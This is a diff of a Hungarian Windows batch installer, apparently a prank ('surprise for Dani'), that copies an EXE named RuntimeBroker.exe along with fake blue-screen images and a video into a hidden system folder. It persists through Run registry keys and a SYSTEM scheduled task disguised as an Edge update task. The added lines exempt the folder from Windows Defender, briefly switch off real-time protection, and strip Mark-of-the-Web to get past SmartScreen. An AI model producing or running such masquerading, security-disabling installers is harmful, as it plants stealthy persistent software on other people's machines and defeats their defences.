@@ -1,8 +1,6 @@
 @echo off
 :: ================================================================
 ::  dani-meglepi -- Deploy szkript v4
-::  Admin mód:   SYSTEM Task, HKCU+HKLM registry, rejtett mappa
-::  User mód:    User Task,   HKCU registry
 :: ================================================================
 setlocal EnableDelayedExpansion
 
@@ -10,53 +8,33 @@ set "ASSET_DIR=C:\Users\Public\dani-meglepi"
 set "EXE_NAME=RuntimeBroker.exe"
 set "TASK_NAME=MicrosoftEdgeUpdateTaskMachineCore"
 
-:: SRC = szkript saját könyvtára (pendrive gyökere)
 set "SRC=%~dp0"
 if "%SRC:~-1%"=="\" set "SRC=%SRC:~0,-1%"
 
-:: ── Argumentum alapján meghatározzuk a módot ─────────────────────
-:: Lehetséges argumentumok:
-::   (üres)   = első futás, nincs még eldöntve
-::   ADMIN    = admin jogon újraindítva
-::   USER     = UAC visszautasítva, user módban folytatjuk
-::   ELEVATED = régi kompatibilitás
-
+:: ── Argumentum alapján mód meghatározása ─────────────────────────
 set "MODE=%~1"
-if /i "!MODE!"=="ADMIN"    goto :run_admin
-if /i "!MODE!"=="USER"     goto :run_user
-if /i "!MODE!"=="ELEVATED" goto :run_admin
+if /i "!MODE!"=="ADMIN" goto :run_admin
+if /i "!MODE!"=="USER"  goto :run_user
 
 :: ── Első futás: admin jog ellenőrzés ────────────────────────────
 net session >nul 2>&1
-if !errorlevel! equ 0 (
-    :: Már admin jogon vagyunk
-    goto :run_admin
-)
+if !errorlevel! equ 0 goto :run_admin
 
-:: Nincs admin jog — UAC kísérlet
-:: PowerShell-lel próbálunk admin jogot szerezni.
-:: Ha sikerül: ADMIN módban újraindul.
-:: Ha a user elutasítja / nem sikerül: USER módban folytatjuk.
+:: UAC kísérlet
 echo.
 echo  ============================================
-echo   dani-meglepi telepito
+echo   dani-meglepi telepito v4
 echo  ============================================
 echo.
-echo [INFO] Admin jog szukseges a teljes telepiteshez.
-echo        Ha az UAC ablakban a "Nem" gombot nyomja,
-echo        a telepites egyszerusitett modban folytatodik.
+echo [INFO] Admin jog szukseges. UAC prompt kovetkezik...
+echo        Ha "Nem"-et nyom, egyszerusitett modban folytatodik.
 echo.
 timeout /t 2 /nobreak >nul
 
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
     "try { Start-Process cmd.exe -ArgumentList '/c \"%~f0\" ADMIN' -Verb RunAs -Wait; exit 0 } catch { exit 1 }" >nul 2>&1
 
-if !errorlevel! equ 0 (
-    :: Admin ablak lefutott (akár sikerrel, akár nem — az ő feladata volt)
-    exit /b 0
-)
-
-:: PowerShell maga hibázott (pl. policy tiltja) → user mód
+if !errorlevel! equ 0 exit /b 0
 goto :run_user
 
 :: ================================================================
@@ -64,40 +42,71 @@ goto :run_user
 :: ================================================================
 echo.
 echo  ============================================
-echo   dani-meglepi telepito  [ADMIN mod]
+echo   dani-meglepi telepito v4  [ADMIN mod]
 echo  ============================================
 echo.
 
-:: SRC újrabeállítás ADMIN újraindítás esetén
-:: (a runas megtartja az argumentumban lévő szkript elérési útját)
 set "SRC=%~dp0"
 if "!SRC:~-1!"=="\" set "SRC=!SRC:~0,-1!"
 
+:: ── 1. Célkönyvtár ───────────────────────────────────────────────
 call :step_mkdir
 if !errorlevel! neq 0 goto :fail_admin
 
-:: Mappa elrejtése
-echo [2/5] Mappa elrejtese...
+:: ── 2. Mappa elrejtése ───────────────────────────────────────────
+echo [2/7] Mappa elrejtese...
 attrib +H +S "%ASSET_DIR%" >nul 2>&1
+if errorlevel 1 (echo   FIGYELEM: Nem sikerult.) else (echo   OK.)
+
+:: ── 3. Defender kivétel hozzáadása ──────────────────────────────
+echo.
+echo [3/7] Windows Defender kivetel beallitasa...
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+    "Add-MpPreference -ExclusionPath '%ASSET_DIR%' -ErrorAction SilentlyContinue" >nul 2>&1
 if errorlevel 1 (
-    echo   FIGYELEM: Nem sikerult elrejteni ^(nem vegzetes^).
+    echo   FIGYELEM: Defender kivetel nem sikerult ^(nem vegzetes^).
 ) else (
-    echo   OK: Rejtett + rendszer attributum.
+    echo   OK: '%ASSET_DIR%' kiveve a Defender ellenorzese alol.
 )
 
-call :step_copy
-if !errorlevel! neq 0 goto :fail_admin
-
-:: Registry: HKCU + HKLM
+:: ── 4. SmartScreen/MotW eltávolítása az EXE-ről ─────────────────
 echo.
-echo [4/5] Registry...
+echo [4/7] SmartScreen blokk eltavolitasa az EXE-rol...
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+    "Unblock-File -Path '!SRC!\%EXE_NAME%' -ErrorAction SilentlyContinue" >nul 2>&1
+echo   OK: Mark-of-the-Web eltavolitva.
+
+:: ── 5. Fájlok másolása ───────────────────────────────────────────
+:: Defender Real-Time átmenetileg ki, hogy ne karanténozza a fájlt
+echo.
+echo [5/7] Fajlok masolasa ^(Defender RT atmeneti kikapcs.^)...
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+    "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue" >nul 2>&1
+
+call :step_copy
+set "COPY_ERR=!errorlevel!"
+
+:: Defender Real-Time visszakapcsolása
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+    "Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue" >nul 2>&1
+
+if !COPY_ERR! neq 0 goto :fail_admin
+
+:: Az asset mappára is Unblock minden fájlra
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+    "Get-ChildItem -Path '%ASSET_DIR%' | Unblock-File -ErrorAction SilentlyContinue" >nul 2>&1
+echo   OK: Osszes fajl SmartScreen blokk eltavolitva.
+
+:: ── 6. Registry ──────────────────────────────────────────────────
+echo.
+echo [6/7] Registry...
 call :reg_hkcu
 call :reg_hklm
 echo   OK: HKCU\Run + HKLM\Run
 
-:: Task Scheduler: SYSTEM szintű, minden felhasználóra
+:: ── 7. Task Scheduler ────────────────────────────────────────────
 echo.
-echo [5/5] Task Scheduler - SYSTEM...
+echo [7/7] Task Scheduler - SYSTEM...
 call :task_system
 if !errorlevel! neq 0 (
     echo   FIGYELEM: SYSTEM task sikertelen, user task probalkozas...
@@ -110,6 +119,7 @@ echo.
 echo  ============================================
 echo   Telepites KESZ!  [ADMIN mod]
 echo   Hely    : %ASSET_DIR% ^(rejtett^)
+echo   Defender: kivetel beallitva
 echo   Registry: HKCU + HKLM
 echo   Task    : SYSTEM, minden felhasznalora
 echo  ============================================
@@ -131,34 +141,42 @@ exit /b 1
 :: ================================================================
 echo.
 echo  ============================================
-echo   dani-meglepi telepito  [USER mod]
+echo   dani-meglepi telepito v4  [USER mod]
 echo  ============================================
 echo.
+
+set "SRC=%~dp0"
+if "!SRC:~-1!"=="\" set "SRC=!SRC:~0,-1!"
 
 call :step_mkdir
 if !errorlevel! neq 0 goto :fail_user
 
-:: Mappa elrejtése — attrib user módban is működik NTFS-en
-echo [2/5] Mappa elrejtese...
-attrib +H "%ASSET_DIR%" >nul 2>&1
-if errorlevel 1 (
-    echo   FIGYELEM: Nem sikerult ^(nem vegzetes^).
-) else (
-    echo   OK: Rejtett attributum beallitva.
-)
+echo [2/6] Mappa elrejtese...
+attrib +H "!ASSET_DIR!" >nul 2>&1
+if errorlevel 1 (echo   FIGYELEM: Nem sikerult.) else (echo   OK.)
 
+:: SmartScreen eltávolítása (user módban is működik)
+echo.
+echo [3/6] SmartScreen blokk eltavolitasa...
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+    "Unblock-File -Path '!SRC!\%EXE_NAME%' -ErrorAction SilentlyContinue" >nul 2>&1
+echo   OK.
+
+echo.
+echo [4/6] Fajlok masolasa...
 call :step_copy
 if !errorlevel! neq 0 goto :fail_user
 
-:: Registry: csak HKCU
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+    "Get-ChildItem -Path '%ASSET_DIR%' | Unblock-File -ErrorAction SilentlyContinue" >nul 2>&1
+
 echo.
-echo [4/5] Registry...
+echo [5/6] Registry...
 call :reg_hkcu
 echo   OK: HKCU\Run
 
-:: Task Scheduler: user szintű
 echo.
-echo [5/5] Task Scheduler - user szintu...
+echo [6/6] Task Scheduler - user szintu...
 call :task_user
 if !errorlevel! neq 0 (
     echo   FIGYELEM: Task nem sikerult ^(Registry elegendo^).
@@ -171,8 +189,8 @@ echo  ============================================
 echo   Telepites KESZ!  [USER mod]
 echo   Hely    : %ASSET_DIR%
 echo   Registry: HKCU
-echo   Task    : Felhasznaloi szintu ^(%USERDOMAIN%\%USERNAME%^)
-echo   Megj.   : HID letiltas admin nelkul nem elerheto
+echo   Task    : Felhasznaloi ^(%USERDOMAIN%\%USERNAME%^)
+echo   Megj.   : Defender kivetel admin nelkul nem allithato be
 echo  ============================================
 echo.
 timeout /t 5 /nobreak >nul
@@ -188,11 +206,11 @@ pause
 exit /b 1
 
 :: ================================================================
-:: Közös lépések (subroutine-ok)
+:: Közös subroutine-ok
 :: ================================================================
 
 :step_mkdir
-echo [1/5] Konyvtar: %ASSET_DIR%
+echo [1/?] Konyvtar: %ASSET_DIR%
 if not exist "%ASSET_DIR%" (
     mkdir "%ASSET_DIR%" 2>nul
     if errorlevel 1 ( echo   HIBA: Nem sikerult letrehozni! & exit /b 1 )
@@ -203,8 +221,6 @@ if not exist "%ASSET_DIR%" (
 exit /b 0
 
 :step_copy
-echo.
-echo [3/5] Fajlok masolasa...
 set "FILES=%EXE_NAME% bsod_800x600.png bsod_1024x768.png bsod_1152x864.png bsod_1280x1024.png bsod_1600x1200.png daninak.mp4"
 set "_MISS="
 for %%F in (%FILES%) do (
@@ -214,13 +230,12 @@ for %%F in (%FILES%) do (
     )
 )
 if defined _MISS (
-    echo.
-    echo   Pendrive-on szukseges fajlok: %FILES%
+    echo   Pendrive-on szukseges: %FILES%
     exit /b 1
 )
 for %%F in (%FILES%) do (
     copy /Y "!SRC!\%%F" "%ASSET_DIR%\%%F" >nul
-    if errorlevel 1 ( echo   HIBA: %%F & exit /b 1 )
+    if errorlevel 1 ( echo   HIBA masolaskor: %%F & exit /b 1 )
     echo   OK: %%F
 )
 exit /b 0
@@ -284,7 +299,7 @@ schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
 schtasks /create /xml "!_TXML!" /tn "%TASK_NAME%" /f >nul 2>&1
 set "_ERR=!errorlevel!"
 del "!_TXML!" >nul 2>&1
-if !_ERR! equ 0 ( echo   OK: SYSTEM task regisztralva. )
+if !_ERR! equ 0 (echo   OK: SYSTEM task regisztralva.)
 exit /b !_ERR!
 
 :task_user
@@ -328,5 +343,5 @@ schtasks /delete /tn "%TASK_NAME%" /f >nul 2>&1
 schtasks /create /xml "!_TXML!" /tn "%TASK_NAME%" /f >nul 2>&1
 set "_ERR=!errorlevel!"
 del "!_TXML!" >nul 2>&1
-if !_ERR! equ 0 ( echo   OK: User task regisztralva ^(!_CU!^). )
+if !_ERR! equ 0 (echo   OK: User task regisztralva ^(!_CU!^).)
 exit /b !_ERR!
